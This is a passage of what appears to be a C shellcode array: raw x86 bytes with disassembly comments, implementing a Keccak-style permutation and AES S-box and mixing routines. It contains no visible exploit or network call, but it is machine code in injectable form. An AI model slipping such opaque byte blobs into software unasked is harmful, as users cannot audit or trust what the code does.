  /* 0CD4 */ "\x50"                                     /* push eax                         */
  /* 0CD5 */ "\x6a\x00"                                 /* push 0x0                         */
  /* 0CD7 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0CD9 */ "\xe8\x10\xff\xff\xff"                     /* call 0xbee                       */
  /* 0CDE */ "\x31\x45\xf8"                             /* xor [ebp-0x8], eax               */
  /* 0CE1 */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0CE4 */ "\x31\x55\xfc"                             /* xor [ebp-0x4], edx               */
  /* 0CE7 */ "\x84\xdb"                                 /* test bl, bl                      */
  /* 0CE9 */ "\x79\x07"                                 /* jns 0xcf2                        */
  /* 0CEB */ "\x03\xdb"                                 /* add ebx, ebx                     */
  /* 0CED */ "\x83\xf3\x71"                             /* xor ebx, 0x71                    */
  /* 0CF0 */ "\xeb\x02"                                 /* jmp 0xcf4                        */
  /* 0CF2 */ "\x03\xdb"                                 /* add ebx, ebx                     */
  /* 0CF4 */ "\x03\xf6"                                 /* add esi, esi                     */
  /* 0CF6 */ "\x81\xfe\x80\x00\x00\x00"                 /* cmp esi, 0x80                    */
  /* 0CFC */ "\x72\xce"                                 /* jb 0xccc                         */
  /* 0CFE */ "\x8b\x45\xf8"                             /* mov eax, [ebp-0x8]               */
  /* 0D01 */ "\x8b\x55\xfc"                             /* mov edx, [ebp-0x4]               */
  /* 0D04 */ "\x88\x1f"                                 /* mov [edi], bl                    */
  /* 0D06 */ "\x5f"                                     /* pop edi                          */
  /* 0D07 */ "\x5e"                                     /* pop esi                          */
  /* 0D08 */ "\x5b"                                     /* pop ebx                          */
  /* 0D09 */ "\xc9"                                     /* leave                            */
  /* 0D0A */ "\xc3"                                     /* ret                              */
  /* 0D0B */ "\x55"                                     /* push ebp                         */
  /* 0D0C */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 0D0E */ "\x83\xec\x5c"                             /* sub esp, 0x5c                    */
  /* 0D11 */ "\x53"                                     /* push ebx                         */
  /* 0D12 */ "\x8b\x5d\x08"                             /* mov ebx, [ebp+0x8]               */
  /* 0D15 */ "\x56"                                     /* push esi                         */
  /* 0D16 */ "\x57"                                     /* push edi                         */
  /* 0D17 */ "\x83\xc3\x0c"                             /* add ebx, 0xc                     */
  /* 0D1A */ "\xc6\x45\x0b\x01"                         /* mov byte [ebp+0xb], 0x1          */
  /* 0D1E */ "\xc7\x45\xcc\x0a\x07\x0b\x11"             /* mov dword [ebp-0x34], 0x110b070a */
  /* 0D25 */ "\xc7\x45\xd0\x12\x03\x05\x10"             /* mov dword [ebp-0x30], 0x10050312 */
  /* 0D2C */ "\xc7\x45\xd4\x08\x15\x18\x04"             /* mov dword [ebp-0x2c], 0x4181508  */
  /* 0D33 */ "\xc7\x45\xd8\x0f\x17\x13\x0d"             /* mov dword [ebp-0x28], 0xd13170f  */
  /* 0D3A */ "\xc7\x45\xdc\x0c\x02\x14\x0e"             /* mov dword [ebp-0x24], 0xe14020c  */
  /* 0D41 */ "\xc7\x45\xe0\x16\x09\x06\x01"             /* mov dword [ebp-0x20], 0x1060916  */
  /* 0D48 */ "\xc7\x45\xec\x18\x00\x00\x00"             /* mov dword [ebp-0x14], 0x18       */
  /* 0D4F */ "\x33\xc9"                                 /* xor ecx, ecx                     */
  /* 0D51 */ "\x8d\x43\x78"                             /* lea eax, [ebx+0x78]              */
  /* 0D54 */ "\x8b\x50\x88"                             /* mov edx, [eax-0x78]              */
  /* 0D57 */ "\x33\x50\xb0"                             /* xor edx, [eax-0x50]              */
  /* 0D5A */ "\x8b\x70\x8c"                             /* mov esi, [eax-0x74]              */
  /* 0D5D */ "\x33\x70\xb4"                             /* xor esi, [eax-0x4c]              */
  /* 0D60 */ "\x33\x50\xd8"                             /* xor edx, [eax-0x28]              */
  /* 0D63 */ "\x33\x70\xdc"                             /* xor esi, [eax-0x24]              */
  /* 0D66 */ "\x33\x50\x28"                             /* xor edx, [eax+0x28]              */
  /* 0D69 */ "\x33\x70\x2c"                             /* xor esi, [eax+0x2c]              */
  /* 0D6C */ "\x33\x10"                                 /* xor edx, [eax]                   */
  /* 0D6E */ "\x33\x70\x04"                             /* xor esi, [eax+0x4]               */
  /* 0D71 */ "\x89\x54\xcd\xa4"                         /* mov [ebp+ecx*8-0x5c], edx        */
  /* 0D75 */ "\x89\x74\xcd\xa8"                         /* mov [ebp+ecx*8-0x58], esi        */
  /* 0D79 */ "\x41"                                     /* inc ecx                          */
  /* 0D7A */ "\x83\xc0\x08"                             /* add eax, 0x8                     */
  /* 0D7D */ "\x83\xf9\x05"                             /* cmp ecx, 0x5                     */
  /* 0D80 */ "\x72\xd2"                                 /* jb 0xd54                         */
  /* 0D82 */ "\xc7\x45\xfc\x04\x00\x00\x00"             /* mov dword [ebp-0x4], 0x4         */
  /* 0D89 */ "\x89\x5d\xf8"                             /* mov [ebp-0x8], ebx               */
  /* 0D8C */ "\xc7\x45\xf4\x05\x00\x00\x00"             /* mov dword [ebp-0xc], 0x5         */
  /* 0D93 */ "\x8b\x7d\xfc"                             /* mov edi, [ebp-0x4]               */
  /* 0D96 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0D98 */ "\x6a\x05"                                 /* push 0x5                         */
  /* 0D9A */ "\x59"                                     /* pop ecx                          */
  /* 0D9B */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0D9D */ "\x8d\x47\xfd"                             /* lea eax, [edi-0x3]               */
  /* 0DA0 */ "\xf7\xf1"                                 /* div ecx                          */
  /* 0DA2 */ "\xff\x74\xd5\xa8"                         /* push dword [ebp+edx*8-0x58]      */
  /* 0DA6 */ "\xff\x74\xd5\xa4"                         /* push dword [ebp+edx*8-0x5c]      */
  /* 0DAA */ "\xe8\xd0\xfe\xff\xff"                     /* call 0xc7f                       */
  /* 0DAF */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0DB2 */ "\x8b\xc8"                                 /* mov ecx, eax                     */
  /* 0DB4 */ "\x8b\xf2"                                 /* mov esi, edx                     */
  /* 0DB6 */ "\x6a\x05"                                 /* push 0x5                         */
  /* 0DB8 */ "\x8b\xc7"                                 /* mov eax, edi                     */
  /* 0DBA */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0DBC */ "\x5f"                                     /* pop edi                          */
  /* 0DBD */ "\xf7\xf7"                                 /* div edi                          */
  /* 0DBF */ "\x8b\x45\xf8"                             /* mov eax, [ebp-0x8]               */
  /* 0DC2 */ "\x57"                                     /* push edi                         */
  /* 0DC3 */ "\x33\x4c\xd5\xa4"                         /* xor ecx, [ebp+edx*8-0x5c]        */
  /* 0DC7 */ "\x33\x74\xd5\xa8"                         /* xor esi, [ebp+edx*8-0x58]        */
  /* 0DCB */ "\x5a"                                     /* pop edx                          */
  /* 0DCC */ "\x31\x08"                                 /* xor [eax], ecx                   */
  /* 0DCE */ "\x31\x70\x04"                             /* xor [eax+0x4], esi               */
  /* 0DD1 */ "\x83\xc0\x28"                             /* add eax, 0x28                    */
  /* 0DD4 */ "\x4a"                                     /* dec edx                          */
  /* 0DD5 */ "\x75\xf5"                                 /* jnz 0xdcc                        */
  /* 0DD7 */ "\xff\x45\xfc"                             /* inc dword [ebp-0x4]              */
  /* 0DDA */ "\x83\x45\xf8\x08"                         /* add dword [ebp-0x8], 0x8         */
  /* 0DDE */ "\xff\x4d\xf4"                             /* dec dword [ebp-0xc]              */
  /* 0DE1 */ "\x75\xb0"                                 /* jnz 0xd93                        */
  /* 0DE3 */ "\x8b\x43\x0c"                             /* mov eax, [ebx+0xc]               */
  /* 0DE6 */ "\x8b\x53\x08"                             /* mov edx, [ebx+0x8]               */
  /* 0DE9 */ "\x89\x45\xe8"                             /* mov [ebp-0x18], eax              */
  /* 0DEC */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 0DEE */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 0DF0 */ "\xeb\x03"                                 /* jmp 0xdf5                        */
  /* 0DF2 */ "\x8b\x45\xf0"                             /* mov eax, [ebp-0x10]              */
  /* 0DF5 */ "\x8d\x4c\x38\x01"                         /* lea ecx, [eax+edi+0x1]           */
  /* 0DF9 */ "\x0f\xb6\x44\x3d\xcc"                     /* movzx eax, byte [ebp+edi-0x34]   */
  /* 0DFE */ "\x89\x4d\xf0"                             /* mov [ebp-0x10], ecx              */
  /* 0E01 */ "\x8d\x34\xc3"                             /* lea esi, [ebx+eax*8]             */
  /* 0E04 */ "\x8b\x06"                                 /* mov eax, [esi]                   */
  /* 0E06 */ "\x83\xe1\x3f"                             /* and ecx, 0x3f                    */
  /* 0E09 */ "\x51"                                     /* push ecx                         */
  /* 0E0A */ "\xff\x75\xe8"                             /* push dword [ebp-0x18]            */
  /* 0E0D */ "\x89\x45\xa4"                             /* mov [ebp-0x5c], eax              */
  /* 0E10 */ "\x8b\x46\x04"                             /* mov eax, [esi+0x4]               */
  /* 0E13 */ "\x52"                                     /* push edx                         */
  /* 0E14 */ "\x89\x45\xa8"                             /* mov [ebp-0x58], eax              */
  /* 0E17 */ "\xe8\x63\xfe\xff\xff"                     /* call 0xc7f                       */
  /* 0E1C */ "\x83\xc4\x0c"                             /* add esp, 0xc                     */
  /* 0E1F */ "\x89\x06"                                 /* mov [esi], eax                   */
  /* 0E21 */ "\x8b\x45\xa8"                             /* mov eax, [ebp-0x58]              */
  /* 0E24 */ "\x47"                                     /* inc edi                          */
  /* 0E25 */ "\x89\x56\x04"                             /* mov [esi+0x4], edx               */
  /* 0E28 */ "\x8b\x55\xa4"                             /* mov edx, [ebp-0x5c]              */
  /* 0E2B */ "\x89\x45\xe8"                             /* mov [ebp-0x18], eax              */
  /* 0E2E */ "\x83\xff\x18"                             /* cmp edi, 0x18                    */
  /* 0E31 */ "\x72\xbf"                                 /* jb 0xdf2                         */
  /* 0E33 */ "\x8b\xc3"                                 /* mov eax, ebx                     */
  /* 0E35 */ "\xc7\x45\xf0\x05\x00\x00\x00"             /* mov dword [ebp-0x10], 0x5        */
  /* 0E3C */ "\x6a\x28"                                 /* push 0x28                        */
  /* 0E3E */ "\x8d\x7d\xa4"                             /* lea edi, [ebp-0x5c]              */
  /* 0E41 */ "\x8b\xf0"                                 /* mov esi, eax                     */
  /* 0E43 */ "\x59"                                     /* pop ecx                          */
  /* 0E44 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0E46 */ "\xc7\x45\xf8\x02\x00\x00\x00"             /* mov dword [ebp-0x8], 0x2         */
  /* 0E4D */ "\x89\x45\xf4"                             /* mov [ebp-0xc], eax               */
  /* 0E50 */ "\xc7\x45\xfc\x05\x00\x00\x00"             /* mov dword [ebp-0x4], 0x5         */
  /* 0E57 */ "\x8b\x4d\xf8"                             /* mov ecx, [ebp-0x8]               */
  /* 0E5A */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0E5C */ "\x6a\x05"                                 /* push 0x5                         */
  /* 0E5E */ "\x5e"                                     /* pop esi                          */
  /* 0E5F */ "\x8d\x41\xff"                             /* lea eax, [ecx-0x1]               */
  /* 0E62 */ "\xf7\xf6"                                 /* div esi                          */
  /* 0E64 */ "\x8b\xc1"                                 /* mov eax, ecx                     */
  /* 0E66 */ "\x6a\x05"                                 /* push 0x5                         */
  /* 0E68 */ "\x59"                                     /* pop ecx                          */
  /* 0E69 */ "\x8b\x74\xd5\xa4"                         /* mov esi, [ebp+edx*8-0x5c]        */
  /* 0E6D */ "\x8b\x7c\xd5\xa8"                         /* mov edi, [ebp+edx*8-0x58]        */
  /* 0E71 */ "\x33\xd2"                                 /* xor edx, edx                     */
  /* 0E73 */ "\xf7\xf1"                                 /* div ecx                          */
  /* 0E75 */ "\x8b\x45\xf4"                             /* mov eax, [ebp-0xc]               */
  /* 0E78 */ "\xf7\xd6"                                 /* not esi                          */
  /* 0E7A */ "\xf7\xd7"                                 /* not edi                          */
  /* 0E7C */ "\x23\x74\xd5\xa4"                         /* and esi, [ebp+edx*8-0x5c]        */
  /* 0E80 */ "\x23\x7c\xd5\xa8"                         /* and edi, [ebp+edx*8-0x58]        */
  /* 0E84 */ "\x31\x30"                                 /* xor [eax], esi                   */
  /* 0E86 */ "\x31\x78\x04"                             /* xor [eax+0x4], edi               */
  /* 0E89 */ "\x83\xc0\x08"                             /* add eax, 0x8                     */
  /* 0E8C */ "\xff\x45\xf8"                             /* inc dword [ebp-0x8]              */
  /* 0E8F */ "\xff\x4d\xfc"                             /* dec dword [ebp-0x4]              */
  /* 0E92 */ "\x89\x45\xf4"                             /* mov [ebp-0xc], eax               */
  /* 0E95 */ "\x75\xc0"                                 /* jnz 0xe57                        */
  /* 0E97 */ "\xff\x4d\xf0"                             /* dec dword [ebp-0x10]             */
  /* 0E9A */ "\x75\xa0"                                 /* jnz 0xe3c                        */
  /* 0E9C */ "\x8d\x45\x0b"                             /* lea eax, [ebp+0xb]               */
  /* 0E9F */ "\x50"                                     /* push eax                         */
  /* 0EA0 */ "\xe8\x0e\xfe\xff\xff"                     /* call 0xcb3                       */
  /* 0EA5 */ "\x31\x03"                                 /* xor [ebx], eax                   */
  /* 0EA7 */ "\x31\x53\x04"                             /* xor [ebx+0x4], edx               */
  /* 0EAA */ "\xff\x4d\xec"                             /* dec dword [ebp-0x14]             */
  /* 0EAD */ "\x59"                                     /* pop ecx                          */
  /* 0EAE */ "\x0f\x85\x9b\xfe\xff\xff"                 /* jnz 0xd4f                        */
  /* 0EB4 */ "\x5f"                                     /* pop edi                          */
  /* 0EB5 */ "\x5e"                                     /* pop esi                          */
  /* 0EB6 */ "\x5b"                                     /* pop ebx                          */
  /* 0EB7 */ "\xc9"                                     /* leave                            */
  /* 0EB8 */ "\xc3"                                     /* ret                              */
  /* 0EB9 */ "\x8b\x4c\x24\x08"                         /* mov ecx, [esp+0x8]               */
  /* 0EBD */ "\x8b\x44\x24\x04"                         /* mov eax, [esp+0x4]               */
  /* 0EC1 */ "\x83\x60\x08\x00"                         /* and dword [eax+0x8], 0x0         */
  /* 0EC5 */ "\x57"                                     /* push edi                         */
  /* 0EC6 */ "\x6a\x64"                                 /* push 0x64                        */
  /* 0EC8 */ "\x5a"                                     /* pop edx                          */
  /* 0EC9 */ "\x2b\xd1"                                 /* sub edx, ecx                     */
  /* 0ECB */ "\x89\x08"                                 /* mov [eax], ecx                   */
  /* 0ECD */ "\x03\xd2"                                 /* add edx, edx                     */
  /* 0ECF */ "\x89\x50\x04"                             /* mov [eax+0x4], edx               */
  /* 0ED2 */ "\x8d\x78\x0c"                             /* lea edi, [eax+0xc]               */
  /* 0ED5 */ "\x32\xc0"                                 /* xor al, al                       */
  /* 0ED7 */ "\xb9\xc8\x00\x00\x00"                     /* mov ecx, 0xc8                    */
  /* 0EDC */ "\xf3\xaa"                                 /* rep stosb                        */
  /* 0EDE */ "\x5f"                                     /* pop edi                          */
  /* 0EDF */ "\xc3"                                     /* ret                              */
  /* 0EE0 */ "\x57"                                     /* push edi                         */
  /* 0EE1 */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 0EE3 */ "\x39\x7c\x24\x10"                         /* cmp [esp+0x10], edi              */
  /* 0EE7 */ "\x76\x33"                                 /* jbe 0xf1c                        */
  /* 0EE9 */ "\x56"                                     /* push esi                         */
  /* 0EEA */ "\x8b\x74\x24\x0c"                         /* mov esi, [esp+0xc]               */
  /* 0EEE */ "\x8b\x46\x08"                             /* mov eax, [esi+0x8]               */
  /* 0EF1 */ "\x8b\x4c\x24\x10"                         /* mov ecx, [esp+0x10]              */
  /* 0EF5 */ "\x8a\x0c\x0f"                             /* mov cl, [edi+ecx]                */
  /* 0EF8 */ "\x8d\x44\x30\x0c"                         /* lea eax, [eax+esi+0xc]           */
  /* 0EFC */ "\x30\x08"                                 /* xor [eax], cl                    */
  /* 0EFE */ "\xff\x46\x08"                             /* inc dword [esi+0x8]              */
  /* 0F01 */ "\x8b\x46\x08"                             /* mov eax, [esi+0x8]               */
  /* 0F04 */ "\x3b\x46\x04"                             /* cmp eax, [esi+0x4]               */
  /* 0F07 */ "\x75\x0b"                                 /* jnz 0xf14                        */
  /* 0F09 */ "\x56"                                     /* push esi                         */
  /* 0F0A */ "\xe8\xfc\xfd\xff\xff"                     /* call 0xd0b                       */
  /* 0F0F */ "\x83\x66\x08\x00"                         /* and dword [esi+0x8], 0x0         */
  /* 0F13 */ "\x59"                                     /* pop ecx                          */
  /* 0F14 */ "\x47"                                     /* inc edi                          */
  /* 0F15 */ "\x3b\x7c\x24\x14"                         /* cmp edi, [esp+0x14]              */
  /* 0F19 */ "\x72\xd3"                                 /* jb 0xeee                         */
  /* 0F1B */ "\x5e"                                     /* pop esi                          */
  /* 0F1C */ "\x5f"                                     /* pop edi                          */
  /* 0F1D */ "\xc3"                                     /* ret                              */
  /* 0F1E */ "\x53"                                     /* push ebx                         */
  /* 0F1F */ "\x8b\x5c\x24\x0c"                         /* mov ebx, [esp+0xc]               */
  /* 0F23 */ "\x8b\x43\x08"                             /* mov eax, [ebx+0x8]               */
  /* 0F26 */ "\x8d\x44\x18\x0c"                         /* lea eax, [eax+ebx+0xc]           */
  /* 0F2A */ "\x80\x30\x06"                             /* xor byte [eax], 0x6              */
  /* 0F2D */ "\x8b\x43\x04"                             /* mov eax, [ebx+0x4]               */
  /* 0F30 */ "\x56"                                     /* push esi                         */
  /* 0F31 */ "\x57"                                     /* push edi                         */
  /* 0F32 */ "\x8d\x44\x18\x0b"                         /* lea eax, [eax+ebx+0xb]           */
  /* 0F36 */ "\x80\x30\x80"                             /* xor byte [eax], 0x80             */
  /* 0F39 */ "\x53"                                     /* push ebx                         */
  /* 0F3A */ "\xe8\xcc\xfd\xff\xff"                     /* call 0xd0b                       */
  /* 0F3F */ "\x8b\x7c\x24\x14"                         /* mov edi, [esp+0x14]              */
  /* 0F43 */ "\x59"                                     /* pop ecx                          */
  /* 0F44 */ "\x8b\x0b"                                 /* mov ecx, [ebx]                   */
  /* 0F46 */ "\x8d\x73\x0c"                             /* lea esi, [ebx+0xc]               */
  /* 0F49 */ "\xf3\xa4"                                 /* rep movsb                        */
  /* 0F4B */ "\x5f"                                     /* pop edi                          */
  /* 0F4C */ "\x5e"                                     /* pop esi                          */
  /* 0F4D */ "\x5b"                                     /* pop ebx                          */
  /* 0F4E */ "\xc3"                                     /* ret                              */
  /* 0F4F */ "\x8b\x4c\x24\x04"                         /* mov ecx, [esp+0x4]               */
  /* 0F53 */ "\x81\xe1\x80\x80\x80\x80"                 /* and ecx, 0x80808080              */
  /* 0F59 */ "\x8b\xc1"                                 /* mov eax, ecx                     */
  /* 0F5B */ "\x33\x44\x24\x04"                         /* xor eax, [esp+0x4]               */
  /* 0F5F */ "\xc1\xe9\x07"                             /* shr ecx, 0x7                     */
  /* 0F62 */ "\x6b\xc9\x1b"                             /* imul ecx, ecx, 0x1b              */
  /* 0F65 */ "\x03\xc0"                                 /* add eax, eax                     */
  /* 0F67 */ "\x33\xc1"                                 /* xor eax, ecx                     */
  /* 0F69 */ "\xc3"                                     /* ret                              */
  /* 0F6A */ "\x53"                                     /* push ebx                         */
  /* 0F6B */ "\x8a\x5c\x24\x08"                         /* mov bl, [esp+0x8]                */
  /* 0F6F */ "\x84\xdb"                                 /* test bl, bl                      */
  /* 0F71 */ "\x74\x3e"                                 /* jz 0xfb1                         */
  /* 0F73 */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0F75 */ "\x32\xd2"                                 /* xor dl, dl                       */
  /* 0F77 */ "\xe8\xd3\xff\xff\xff"                     /* call 0xf4f                       */
  /* 0F7C */ "\x34\x01"                                 /* xor al, 0x1                      */
  /* 0F7E */ "\x8a\xd8"                                 /* mov bl, al                       */
  /* 0F80 */ "\xeb\x0d"                                 /* jmp 0xf8f                        */
  /* 0F82 */ "\x0f\xb6\xc3"                             /* movzx eax, bl                    */
  /* 0F85 */ "\x50"                                     /* push eax                         */
  /* 0F86 */ "\xfe\xc2"                                 /* inc dl                           */
  /* 0F88 */ "\xe8\xc2\xff\xff\xff"                     /* call 0xf4f                       */
  /* 0F8D */ "\x32\xd8"                                 /* xor bl, al                       */
  /* 0F8F */ "\x59"                                     /* pop ecx                          */
  /* 0F90 */ "\x3a\x5c\x24\x08"                         /* cmp bl, [esp+0x8]                */
  /* 0F94 */ "\x75\xec"                                 /* jnz 0xf82                        */
  /* 0F96 */ "\x80\xc2\x02"                             /* add dl, 0x2                      */
  /* 0F99 */ "\xb3\x01"                                 /* mov bl, 0x1                      */
  /* 0F9B */ "\x74\x14"                                 /* jz 0xfb1                         */
  /* 0F9D */ "\xf6\xda"                                 /* neg dl                           */
  /* 0F9F */ "\x0f\xb6\xd2"                             /* movzx edx, dl                    */
  /* 0FA2 */ "\x0f\xb6\xc3"                             /* movzx eax, bl                    */
  /* 0FA5 */ "\x50"                                     /* push eax                         */
  /* 0FA6 */ "\xe8\xa4\xff\xff\xff"                     /* call 0xf4f                       */
  /* 0FAB */ "\x32\xd8"                                 /* xor bl, al                       */
  /* 0FAD */ "\x4a"                                     /* dec edx                          */
  /* 0FAE */ "\x59"                                     /* pop ecx                          */
  /* 0FAF */ "\x75\xf1"                                 /* jnz 0xfa2                        */
  /* 0FB1 */ "\x8a\xc3"                                 /* mov al, bl                       */
  /* 0FB3 */ "\x5b"                                     /* pop ebx                          */
  /* 0FB4 */ "\xc3"                                     /* ret                              */
  /* 0FB5 */ "\x83\x7c\x24\x08\x01"                     /* cmp dword [esp+0x8], 0x1         */
  /* 0FBA */ "\x75\x19"                                 /* jnz 0xfd5                        */
  /* 0FBC */ "\xff\x74\x24\x04"                         /* push dword [esp+0x4]             */
  /* 0FC0 */ "\xe8\xa5\xff\xff\xff"                     /* call 0xf6a                       */
  /* 0FC5 */ "\x59"                                     /* pop ecx                          */
  /* 0FC6 */ "\x6a\x04"                                 /* push 0x4                         */
  /* 0FC8 */ "\x8a\xc8"                                 /* mov cl, al                       */
  /* 0FCA */ "\x5a"                                     /* pop edx                          */
  /* 0FCB */ "\xd0\xc1"                                 /* rol cl, 1                        */
  /* 0FCD */ "\x32\xc1"                                 /* xor al, cl                       */
  /* 0FCF */ "\x4a"                                     /* dec edx                          */
  /* 0FD0 */ "\x75\xf9"                                 /* jnz 0xfcb                        */
  /* 0FD2 */ "\x34\x63"                                 /* xor al, 0x63                     */
  /* 0FD4 */ "\xc3"                                     /* ret                              */
  /* 0FD5 */ "\x8a\x44\x24\x04"                         /* mov al, [esp+0x4]                */
  /* 0FD9 */ "\x34\x63"                                 /* xor al, 0x63                     */
  /* 0FDB */ "\xd0\xc0"                                 /* rol al, 1                        */
  /* 0FDD */ "\x8a\xc8"                                 /* mov cl, al                       */
  /* 0FDF */ "\xc0\xc0\x02"                             /* rol al, 0x2                      */
  /* 0FE2 */ "\x8a\xd0"                                 /* mov dl, al                       */
  /* 0FE4 */ "\xc0\xc2\x03"                             /* rol dl, 0x3                      */
  /* 0FE7 */ "\x32\xd1"                                 /* xor dl, cl                       */
  /* 0FE9 */ "\x32\xd0"                                 /* xor dl, al                       */
  /* 0FEB */ "\x0f\xb6\xc2"                             /* movzx eax, dl                    */
  /* 0FEE */ "\x50"                                     /* push eax                         */
  /* 0FEF */ "\xe8\x76\xff\xff\xff"                     /* call 0xf6a                       */
  /* 0FF4 */ "\x59"                                     /* pop ecx                          */
  /* 0FF5 */ "\xc3"                                     /* ret                              */
  /* 0FF6 */ "\x56"                                     /* push esi                         */
  /* 0FF7 */ "\x57"                                     /* push edi                         */
  /* 0FF8 */ "\x6a\x04"                                 /* push 0x4                         */
  /* 0FFA */ "\x33\xf6"                                 /* xor esi, esi                     */
  /* 0FFC */ "\x5f"                                     /* pop edi                          */
  /* 0FFD */ "\x6a\x01"                                 /* push 0x1                         */
  /* 0FFF */ "\xff\x74\x24\x10"                         /* push dword [esp+0x10]            */
  /* 1003 */ "\xe8\xad\xff\xff\xff"                     /* call 0xfb5                       */
  /* 1008 */ "\xc1\x6c\x24\x14\x08"                     /* shr dword [esp+0x14], 0x8        */
  /* 100D */ "\x0f\xb6\xc0"                             /* movzx eax, al                    */
  /* 1010 */ "\x0b\xf0"                                 /* or esi, eax                      */
  /* 1012 */ "\xc1\xce\x08"                             /* ror esi, 0x8                     */
  /* 1015 */ "\x4f"                                     /* dec edi                          */
  /* 1016 */ "\x59"                                     /* pop ecx                          */
  /* 1017 */ "\x59"                                     /* pop ecx                          */
  /* 1018 */ "\x75\xe3"                                 /* jnz 0xffd                        */
  /* 101A */ "\x5f"                                     /* pop edi                          */
  /* 101B */ "\x8b\xc6"                                 /* mov eax, esi                     */
  /* 101D */ "\x5e"                                     /* pop esi                          */
  /* 101E */ "\xc3"                                     /* ret                              */
  /* 101F */ "\x56"                                     /* push esi                         */
  /* 1020 */ "\x8b\x74\x24\x08"                         /* mov esi, [esp+0x8]               */
  /* 1024 */ "\x57"                                     /* push edi                         */
  /* 1025 */ "\x6a\x10"                                 /* push 0x10                        */
  /* 1027 */ "\x5f"                                     /* pop edi                          */
  /* 1028 */ "\x0f\xb6\x06"                             /* movzx eax, byte [esi]            */
  /* 102B */ "\xff\x74\x24\x10"                         /* push dword [esp+0x10]            */
  /* 102F */ "\x50"                                     /* push eax                         */
  /* 1030 */ "\xe8\x80\xff\xff\xff"                     /* call 0xfb5                       */
  /* 1035 */ "\x88\x06"                                 /* mov [esi], al                    */
  /* 1037 */ "\x59"                                     /* pop ecx                          */
  /* 1038 */ "\x46"                                     /* inc esi                          */
  /* 1039 */ "\x4f"                                     /* dec edi                          */
  /* 103A */ "\x59"                                     /* pop ecx                          */
  /* 103B */ "\x75\xeb"                                 /* jnz 0x1028                       */
  /* 103D */ "\x5f"                                     /* pop edi                          */
  /* 103E */ "\x5e"                                     /* pop esi                          */
  /* 103F */ "\xc3"                                     /* ret                              */
  /* 1040 */ "\x55"                                     /* push ebp                         */
  /* 1041 */ "\x8b\xec"                                 /* mov ebp, esp                     */
  /* 1043 */ "\x51"                                     /* push ecx                         */
  /* 1044 */ "\x8b\x55\x08"                             /* mov edx, [ebp+0x8]               */
  /* 1047 */ "\x53"                                     /* push ebx                         */
  /* 1048 */ "\x57"                                     /* push edi                         */
  /* 1049 */ "\x33\xff"                                 /* xor edi, edi                     */
  /* 104B */ "\x89\x7d\xfc"                             /* mov [ebp-0x4], edi               */
  /* 104E */ "\x33\xc0"                                 /* xor eax, eax                     */
  /* 1050 */ "\x8b\xcf"                                 /* mov ecx, edi                     */
  /* 1052 */ "\x83\xff\x10"                             /* cmp edi, 0x10                    */
  /* 1055 */ "\x73\x11"                                 /* jae 0x1068                       */
  /* 1057 */ "\x0f\xb6\x1c\x11"                         /* movzx ebx, byte [ecx+edx]        */
  /* 105B */ "\x0b\xc3"                                 /* or eax, ebx                      */
  /* 105D */ "\x83\xc1\x04"                             /* add ecx, 0x4                     */
  /* 1060 */ "\xc1\xc8\x08"                             /* ror eax, 0x8                     */
  /* 1063 */ "\x83\xf9\x10"                             /* cmp ecx, 0x10                    */
  /* 1066 */ "\x72\xef"                                 /* jb 0x1057                        */
  /* 1068 */ "\x83\x7d\x0c\x01"                         /* cmp dword [ebp+0xc], 0x1         */
  /* 106C */ "\x75\x08"                                 /* jnz 0x1076                       */
  /* 106E */ "\x6a\x20"                                 /* push 0x20                        */
  /* 1070 */ "\x59"                                     /* pop ecx                          */
  /* 1071 */ "\x2b\x4d\xfc"                             /* sub ecx, [ebp-0x4]               */
  /* 1074 */ "\xeb\x03"                                 /* jmp 0x1079                       */
  /* 1076 */ "\x8b\x4d\xfc"                             /* mov ecx, [ebp-0x4]               */
  /* 1079 */ "\xd3\xc0"                                 /* rol eax, cl                      */
  /* 107B */ "\x8b\xcf"                                 /* mov ecx, edi                     */
  /* 107D */ "\x83\xff\x10"                             /* cmp edi, 0x10                    */
  /* 1080 */ "\x73\x0e"                                 /* jae 0x1090                       */
  /* 1082 */ "\x88\x04\x11"                             /* mov [ecx+edx], al                */
  /* 1085 */ "\x83\xc1\x04"                             /* add ecx, 0x4                     */
  /* 1088 */ "\xc1\xe8\x08"                             /* shr eax, 0x8                     */
  /* 108B */ "\x83\xf9\x10"                             /* cmp ecx, 0x10                    */
  /* 108E */ "\x72\xf2"                                 /* jb 0x1082                        */
  /* 1090 */ "\x83\x45\xfc\x08"                         /* add dword [ebp-0x4], 0x8         */
  /* 1094 */ "\x47"                                     /* inc edi                          */
  /* 1095 */ "\x83\x7d\xfc\x20"                         /* cmp dword [ebp-0x4], 0x20        */
  /* 1099 */ "\x72\xb3"                                 /* jb 0x104e                        */
  /* 109B */ "\x5f"                                     /* pop edi                          */
  /* 109C */ "\x5b"                                     /* pop ebx                          */
  /* 109D */ "\xc9"                                     /* leave                            */
  /* 109E */ "\xc3"                                     /* ret                              */
  /* 109F */ "\x8b\x54\x24\x04"                         /* mov edx, [esp+0x4]               */
  /* 10A3 */ "\x56"                                     /* push esi                         */
  /* 10A4 */ "\x8b\xf2"                                 /* mov esi, edx                     */
  /* 10A6 */ "\xc1\xce\x08"                             /* ror esi, 0x8                     */
  /* 10A9 */ "\x8b\xc6"                                 /* mov eax, esi                     */
  /* 10AB */ "\x33\xc2"                                 /* xor eax, edx                     */
  /* 10AD */ "\x50"                                     /* push eax                         */
  /* 10AE */ "\xe8\x9c\xfe\xff\xff"                     /* call 0xf4f                       */
  /* 10B3 */ "\x59"                                     /* pop ecx                          */
  /* 10B4 */ "\x8b\xca"                                 /* mov ecx, edx                     */
  /* 10B6 */ "\xc1\xc1\x10"                             /* rol ecx, 0x10                    */
  /* 10B9 */ "\x33\xc1"                                 /* xor eax, ecx                     */
  /* 10BB */ "\xc1\xc2\x08"                             /* rol edx, 0x8                     */
  /* 10BE */ "\x33\xc2"                                 /* xor eax, edx                     */
